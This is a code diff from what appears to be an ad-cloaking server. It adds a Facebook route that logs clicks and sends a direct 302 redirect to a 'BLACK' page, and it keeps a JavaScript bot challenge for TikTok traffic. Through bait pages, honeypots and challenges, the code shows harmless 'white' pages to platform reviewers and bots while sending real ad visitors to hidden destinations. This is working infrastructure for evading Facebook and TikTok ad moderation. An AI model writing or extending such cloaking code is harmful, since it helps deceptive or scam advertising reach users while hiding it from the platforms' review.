@@ -2897,15 +2897,51 @@ export async function registerRoutes(
         return res.send(baitHTML);
       }
 
-      // For BLACK page candidates (TikTok/Facebook) - DO NOT LOG YET
+      // ==========================================
+      // FACEBOOK - DIRECT REDIRECT (NO CHALLENGE)
+      // ==========================================
+      // Facebook uses simple validation: params + filters → direct redirect
+      // No JavaScript challenge needed - just redirect immediately
+      if (offer.platform === "facebook") {
+        // Log the click
+        await storage.createClickLog({
+          offerId: offer.id,
+          userId: offer.userId,
+          ipAddress: ip,
+          userAgent,
+          country,
+          device: deviceType,
+          redirectedTo: 'black',
+          requestUrl,
+          responseTimeMs: duration,
+          hasError: false,
+          allParams: {
+            domainId: domain?.id || offer.domainId || null,
+            platform: offer.platform,
+            referer,
+            fbcl: fbcl || null,
+            campaignName: fbcl?.split("|")[0] || null,
+            campaignId: fbcl?.split("|")[1] || null,
+            xcode: xcode || null,
+          },
+        });
+
+        await storage.incrementOfferClicks(offer.id, true);
+        console.log(`[Facebook] BLACK redirect for ${slug} (${duration}ms) - Direct redirect to: ${targetUrl}`);
+        
+        // Direct 302 redirect - no intermediate page
+        res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+        return res.redirect(302, targetUrl);
+      }
+
+      // For BLACK page candidates (TikTok only - uses JavaScript challenge)
       // The click will be logged AFTER the JavaScript challenge is completed
-      // This ensures bots that fail the challenge are logged as WHITE, not BLACK
       console.log(`[Cloak] BLACK candidate for ${slug} (${duration}ms) - serving JavaScript challenge`);
 
       // ==========================================
-      // JAVASCRIPT CHALLENGE FOR BLACK PAGE ACCESS
+      // JAVASCRIPT CHALLENGE FOR BLACK PAGE ACCESS (TikTok only)
       // ==========================================
-      // Instead of redirecting directly to black page, serve a challenge page
+      // TikTok (not TikTok2) uses a JavaScript challenge page
       // that verifies the visitor is a real human with a real browser
       
       // Generate challenge token and store challenge data
@@ -3296,12 +3332,49 @@ export async function registerRoutes(
         return res.send(baitHTML);
       }
 
-      // For BLACK page candidates (TikTok/Facebook) - DO NOT LOG YET
+      // ==========================================
+      // FACEBOOK - DIRECT REDIRECT (NO CHALLENGE)
+      // ==========================================
+      // Facebook uses simple validation: params + filters → direct redirect
+      // No JavaScript challenge needed - just redirect immediately
+      if (offer.platform === "facebook") {
+        // Log the click
+        await storage.createClickLog({
+          offerId: offer.id,
+          userId: offer.userId,
+          ipAddress: ip,
+          userAgent,
+          country,
+          device: deviceType,
+          redirectedTo: 'black',
+          requestUrl,
+          responseTimeMs: duration,
+          hasError: false,
+          allParams: {
+            domainId: domain?.id || offer.domainId || null,
+            platform: offer.platform,
+            referer,
+            fbcl: fbcl || null,
+            campaignName: fbcl?.split("|")[0] || null,
+            campaignId: fbcl?.split("|")[1] || null,
+            xcode: xcode || null,
+          },
+        });
+
+        await storage.incrementOfferClicks(offer.id, true);
+        console.log(`[Facebook] BLACK redirect for ${slug} (${duration}ms) - Direct redirect to: ${targetUrl}`);
+        
+        // Direct 302 redirect - no intermediate page
+        res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+        return res.redirect(302, targetUrl);
+      }
+
+      // For BLACK page candidates (TikTok only - uses JavaScript challenge)
       // The click will be logged AFTER the JavaScript challenge is completed
       console.log(`[Cloak] BLACK candidate for ${slug} (${duration}ms) - serving JavaScript challenge`);
 
       // ==========================================
-      // JAVASCRIPT CHALLENGE FOR BLACK PAGE ACCESS
+      // JAVASCRIPT CHALLENGE FOR BLACK PAGE ACCESS (TikTok only)
       // ==========================================
       const challengeToken = generateChallengeToken();
       const honeypotId = `hp_${randomBytes(4).toString('hex')}`;
